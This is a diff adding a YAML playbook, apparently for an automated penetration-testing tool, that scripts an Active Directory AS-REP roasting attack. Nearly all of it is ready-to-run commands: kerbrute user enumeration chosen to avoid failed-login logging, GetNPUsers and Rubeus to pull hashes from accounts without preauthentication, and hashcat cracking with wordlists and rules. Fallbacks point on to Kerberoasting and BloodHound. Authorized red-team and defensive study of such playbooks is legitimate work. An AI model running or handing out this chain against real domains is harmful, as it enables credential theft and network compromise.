@@ -1,0 +1,40 @@
+id: ad_asreproast
+title: "AD — AS-REP roasting (no preauth)"
+phase: lateral
+mitre: ["T1558.004"]
+trigger:
+  services: ["kerberos", "ldap"]
+  ports:    [88, 389, 636]
+  os_any:   ["windows", "windows server"]
+  technologies: ["active directory"]
+keywords: ["asreproast", "as-rep", "preauth disabled", "DONT_REQ_PREAUTH"]
+preconditions:
+  - "Domain FQDN known + DC IP reachable on TCP/88"
+  - "User list available (from null SMB / kerbrute / cred leak)"
+steps:
+  - tool: kerbrute
+    cmd:  "kerbrute userenum --dc {dc_ip} -d {domain} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
+    why:  "Build a verified user list via Kerberos pre-auth response (UNAUTH'd, no log-as-failed-login)"
+  - tool: GetNPUsers
+    cmd:  "GetNPUsers.py {domain}/ -no-pass -usersfile users.txt -dc-ip {dc_ip} -outputfile asrep.kerb -format hashcat"
+    why:  "Request AS-REPs for every user that has UF_DONT_REQUIRE_PREAUTH set — no creds needed"
+  - tool: GetNPUsers
+    cmd:  "GetNPUsers.py {domain}/{user}:{password} -dc-ip {dc_ip} -request -format hashcat -outputfile asrep.kerb"
+    why:  "Authenticated variant — enumerates all preauth-disabled accounts via LDAP filter"
+  - tool: rubeus
+    cmd:  "Rubeus.exe asreproast /domain:{domain} /format:hashcat /outfile:asrep.kerb"
+    why:  "From a domain-joined Windows host (no creds)"
+  - tool: hashcat
+    cmd:  "hashcat -m 18200 asrep.kerb /usr/share/wordlists/rockyou.txt --force -O"
+    why:  "Crack AS-REP hashes — typically faster than Kerberoast (RC4-HMAC-MD5)"
+  - tool: hashcat
+    cmd:  "hashcat -m 18200 asrep.kerb /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -O"
+    why:  "Apply rules when straight wordlist fails"
+expected_outcome: "Plaintext password for at least one preauth-disabled account → domain foothold"
+fallbacks:
+  - "If no preauth-disabled accounts → pivot to Kerberoast (T1558.003) which only needs valid creds"
+  - "After cracking → BloodHound to find paths to high-value targets"
+  - "Disabled / expired accounts may still have crackable hashes — try them"
+references:
+  - "https://attack.mitre.org/techniques/T1558/004/"
+  - "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast"
